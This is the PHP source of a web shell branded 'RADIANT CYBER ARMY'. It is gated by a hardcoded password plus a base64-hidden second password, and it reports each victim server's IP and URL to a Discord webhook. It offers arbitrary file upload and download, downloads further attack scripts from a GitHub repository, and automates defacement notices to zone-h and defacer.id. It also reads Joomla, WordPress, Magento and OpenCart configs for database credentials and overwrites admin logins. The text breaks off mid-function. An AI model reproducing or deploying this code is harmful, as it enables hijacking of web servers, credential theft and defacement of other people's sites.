<?php
/* HAXXOR CYBER ARMY PRIVATE TOOLS */
set_time_limit(0);
error_reporting(0); 
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');
$_n = 'RADIANT CYBER ARMY';
$_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
$_r = "required='required'";
$_x = "<i class='bi bi-menu-up'></i>";
session_start();
set_time_limit(0);
$_n = 'RADIANT CYBER ARMY';
$password = "RCA";
$wd = base64_decode("eFlodXJpY2theA==");
$sessioncode = md5(__FILE__);
if(!empty($password) && empty($_SESSION[$sessioncode])){ 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    } else if(isset($_REQUEST['pass']) and $_REQUEST['pass'] == $wd){
        $_SESSION[$sessioncode] = $wd;
    }

    else {
 {
$alert = "$path IP : [ " . $_SERVER['REMOTE_ADDR']."http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']. " ]";$url = "https://discord.com/api/webhooks/1039634630791401502/wEcKEo27Y2LDDkfBUVUFyyKd045AIjDlgl2ev5h7N0cNwo7Xnx-bybJyvjKeGX4D3fYV";$curl = curl_init($url);curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_POST, true);curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);$headers = array("Content-Type: application/x-www-form-urlencoded",);curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);$data = "content=$alert";curl_setopt($curl, CURLOPT_POSTFIELDS, $data);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);$resp = curl_exec($curl);curl_close($curl);{

}
if(isset($_GET['blk-upl'])){ echo "<form method='post' enctype='multipart/form-data'>
  <input type='file' name='id_file'> <input type='submit' name='u' value='upl'> </form>";
$root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['id_file']['name']; $dest = $root.'/'.$files;
if(isset($_POST['u'])) {
if(is_writable($root)) {
if(@copy($_FILES['id_file']['tmp_name'], $dest)) {
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "s u -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
} else { echo "g u d d r."; } } else {
if(@copy($_FILES['id_file']['tmp_name'], $files)) { echo "s <b>$files</b> d"; } else { echo "g"; } } } } }{}
print '<!DOCTYPE html>
<html lang="en">
<head>
<title>RCA - 403 BYPASS SHELL</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/x-icon" href="https://i.ibb.co/HCrv3Nt/RCA.png">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet" type="text/css">
    <div class="texture"></div>
    <div class="texture2"></div>
    <style>
        .texture {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -100;
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover;
        }

        .texture2 {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -100;
            background-color: black;
            opacity: 0.6;
    </style>
<style>
body{
  padding:100px 0;
  background-color:#202b54;
}
a, a:hover{
  color:#333
}
</style>
</head>
<body>
<div class="container">
<div class="row justify-content-center">
  <div class="col-4">
  <form method="post">
  <div class="form-group">
  <center>
  <img src="https://i.ibb.co/HCrv3Nt/RCA.png" width=250px height=250px></img>
   </center><br>
  <div class="input-group" id="show_hide_password">
    <input class="form-control" name="pass" type="password">
    <div class="input-group-addon">
    <a href=""><i class="fa fa-eye-slash" aria-hidden="true"></i></a>
</font>
 </div>
 </div>
      <label style="color:yellow">PASSWORD ENCRYPTED</center>
</div>
</form>
</div>
</div>
</div>
</body>
</html>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<center>
<font size="4" ; color="yellow"> K4SH1 | ~3mpty | PH K1D0 | V3ND3TTA | 4K4TZ | Yhuricka | PH K0K4k | H04X | Mr.D347H | b@lc0m |
</center>
<center>
<font size="1" ; color="red"> Developed By Yhuricka Usuopmaki @ 2022
</center>
<script src="https://cdn.jsdelivr.net/npm/@widgetbot/crate@3" async defer>
  new Crate({
    server: "1039593642513412137",
    channel: "1039593642983178282"
  })
</script>
<audio src="#" autoplay="autoplay" loop="loop" id="lagu">

</audio>
<audio>';
        exit;  

    }
  } 
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
echo(file_get_contents($_POST['path']));
exit();
}
function ▟($path,$p) {
if(isset($_GET['path'])) {
	$▚ = $_GET['path'];
} else {
	$▚ = getcwd();
}
if(is_writable($▚)) {
	return "<gr class='anu'>".$p."</gr>";
} else {
	return "<rd class='anu'>".$p."</rd>";
	}
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$sz = array('B','KB','MB','GB','TB');
	for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$sz[$i]);
}
function ip() {
	$ipas = '';
if(getenv('HTTP_CLIENT_IP'))
	$ipas = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipas = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipas = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipas = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipas = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipas = getenv('REMOTE_ADDR');
else
	$ipas = 'IP tidak dikenali';
return $ipas;
}
function p($file){
if($p = @fileperms($file)){
	$i = 'u';
if(($p & 0xC000) == 0xC000)$i = 's';
elseif(($p & 0xA000) == 0xA000)$i = 'l';
elseif(($p & 0x8000) == 0x8000)$i = '-';
elseif(($p & 0x6000) == 0x6000)$i = 'b';
elseif(($p & 0x4000) == 0x4000)$i = 'd';
elseif(($p & 0x2000) == 0x2000)$i = 'c';
elseif(($p & 0x1000) == 0x1000)$i = 'p';
	$i .= ($p & 00400)? 'r':'-';
	$i .= ($p & 00200)? 'w':'-';
	$i .= ($p & 00100)? 'x':'-';
	$i .= ($p & 00040)? 'r':'-';
	$i .= ($p & 00020)? 'w':'-';
	$i .= ($p & 00010)? 'x':'-';
	$i .= ($p & 00004)? 'r':'-';
	$i .= ($p & 00002)? 'w':'-';
	$i .= ($p & 00001)? 'x':'-';
return $i;
	}
	else return "- ?? -";
}
$disfunc = @ini_get("disable_functions");
if(empty($disfunc)) {
	$disfc = "<gr>NONE</gr>";
} else {
	$disfc = "<rd>$disfunc</rd>";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
echo "
<!DOCTYPE HTML>
<html>
	<head>
		<meta name='author' content='$_n'>
		<meta name='robots' content='noindex,nofollow'>
		<title>RCA 403 SHELL</title>
		<link rel='stylesheet' href='//feb.ulb.ac.id/wp-admin/css/fax.css'>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
<body style='background-color:yellow;' class='py-3' class='box shadow bg-dark p-4 rounded-3'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary anu'>BYPASS SHELL 403</div>
			<img src=https://i.imgur.com/BjzXDbK.gif width=80px height=80px></img>

				<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>$_n</h4></a>";
				if(isset($_GET['path'])){
					$path = $_GET['path'];
				} else {
					$path = getcwd();
				}
					$path = str_replace('\\','/',$path);
					$paths = explode('/',$path);
				foreach($paths as $id=>$pat){
				if($pat == '' && $id == 0){
					$a = true;
					echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
				continue;
				}
				if($pat == '') continue;
					echo '<a class="text-decoration-none" href="?path=';
				for($i=0;$i<=$id;$i++){
					echo "$paths[$i]";
				if($i != $id) echo "/";
				}
				echo '">'.$pat.'</a>/';
				}
				echo " [ ".▟($path, p($path))." ]</div>";
			echo "
		</div>
	</div>
</div>
<div class='container-fluid'>
	<div class='box shadow bg-dark p-4 rounded-3'>
		<div class='corner anu'>
			<p style=color:white data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'><i class='bi bi-info-circle'></i> SERVER INFO <i class='bi bi-chevron-down'></i></p>
		</div>
	<div class='collapse text-dark mb-3' id='collapseExample'>
		<div class='box shadow bg-light p-4 rounded-3'>
			Uname: <gr>".php_uname()."</gr><br />
			Software: <gr>".$_SERVER['SERVER_SOFTWARE']."</gr><br />
			PHP version: <gr>".PHP_VERSION."</gr> <a class='text-decoration-none' href='?phpinfo&path=$path'>[ PHP INFO ]</a> PHP os: <gr>".PHP_OS."</gr><br />
			Server Ip: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br />
			User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br />
			Safe Mode: $sm<br />
			Disable Function:<div class='table-responsive'>$disfc</div>
		</div>
	</div>
<div class='text-center'>
	<div class='btn-group'>
	    <a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?'></i>HOME</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?upload&path=$path'></i>UPLOAD</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?mass_deface&path=$path'></i>MASS DEFACE</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=zoneh'>ZONE-H</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=defacer'>DEFACER ID</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?mass_delete&path=$path'></i>MASS DELETE</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&web=jumping'>JUMPING</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=config'>GRAB CONFIG</a>
		<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=edit_user'>AUTO EDIT USER JOOMLA</a>
	</div>
	<div class='text-center'>
	<div class='btn-group'>
	<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=adminer'>ADMINER</a>
	<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=smtp'>GRAB SMTP</a>
	<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=mailer'>MAILER UNDETECTED</a>
	<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=uploader'>BYPASS PHP UPLOADER</a>
	<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=resetcpanelpw'>CPANEL RESET PASSWORD</a>
	<a style=color:white;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=unzip'>UNZIP</a>
	</div>
</div>";
// tools nya
if(isset($_GET['path'])) {
	$dir = $_GET['path'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
for($i = 0; $i <= $c_dir; $i++) {
	$scdir[$i];
	if($i != $c_dir) {
}
$alert = "$path IP : [ " . $_SERVER['REMOTE_ADDR']."http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']. " ]";$url = "#";$curl = curl_init($url);curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_POST, true);curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);$headers = array("Content-Type: application/x-www-form-urlencoded",);curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);$data = "content=$alert";curl_setopt($curl, CURLOPT_POSTFIELDS, $data);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);$resp = curl_exec($curl);curl_close($curl);
if ($_GET['do'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('adminer.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/adminer.php' target='_blank'>ADMINER LOGIN</a></font></center>";
    } else {
        if (adminer("https://raw.githubusercontent.com/private13377/private13377/main/adminer-4.8.1.php", "adminer.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/adminer.php' target='_blank'>ADMINER LOGIN</a></font></center>";
        } else {
            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create admin file</font></center>";
        }
    }
}
if ($_GET['do'] == 'resetcpanelpw') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('cpreset.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>CPANEL RESET PASSWORD CLICK HERE !</a></font></center>";
    } else {
        if (adminer("https://raw.githubusercontent.com/private13377/private13377/main/cpanel.php", "cpreset.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>CPANEL RESET PASSWORD CLICK HERE !</a></font></center>";
        } else {
            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create cpanel file</font></center>";
        }
    }
}
if ($_GET['do'] == 'unzip') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('unzip.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/unzip.php' target='_blank'>UNZIP</a></font></center>";
    } else {
        if (adminer("https://raw.githubusercontent.com/private13377/private13377/main/unzip.php", "unzip.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/cpreset.php' target='_blank'>UNZIP</a></font></center>";
        } else {
            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create unzipper file</font></center>";
        }
    }
}
if ($_GET['do'] == 'mailer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('mail.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php?pass=eTrx!tgd' target='_blank'>CLICK HERE PHP MAILER</a></font></center>";
    } else {
        if (adminer("https://raw.githubusercontent.com/private13377/private13377/main/mail.php", "mail.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php?pass=eTrx!tgd' target='_blank'>CLICK HERE PHP MAILER</a></font></center>";
        } else {
            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create mailer file</font></center>";
        }
    }
}
if ($_GET['do'] == 'uploader') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('upl.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/upl.php?prv8-upl' target='_blank'>PHP UPLOADER</a></font></center>";
    } else {
        if (adminer("https://raw.githubusercontent.com/private13377/private13377/main/upl.php", "upl.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/upl.php?prv8-upl' target='_blank'>PHP UPLOADER</a></font></center>";
        } else {
            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create uploader file</font></center>";
        }
    }
}
if ($_GET['do'] == 'smtp') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if (file_exists('smtp.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php' target='_blank'>SMTP</a></font></center>";
    } else {
        if (adminer("https://raw.githubusercontent.com/private13377/private13377/main/smtp.php", "smtp.php")) {
            echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/smtp.php' target='_blank'>SMTP</a></font></center>";
        } else {
            echo "<center><font class='btn btn-outline-light btn-sm'>failed to create smtp file</font></center>";
        }
    }
}
if($_GET['do'] == 'defacer') {
echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='notiper' size='50' value='K4SH1'><br>
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='RADIANT CYBER ARMY'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
        <input type='submit' name='go' value='Submit' style='width: 450px;'>
        </form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$notiper = $_POST['notiper'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://defacer.id/archive/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$notiper";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}
if($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=#18BC9C>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='RADIANT CYBER ARMY'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' class='btn btn-success btn-sm' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
} elseif($_GET['do'] == 'edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "Username or Password must be more than 6 characters";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>Error, can't get the domain name</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>Error, can't get the domain name</font><br>";
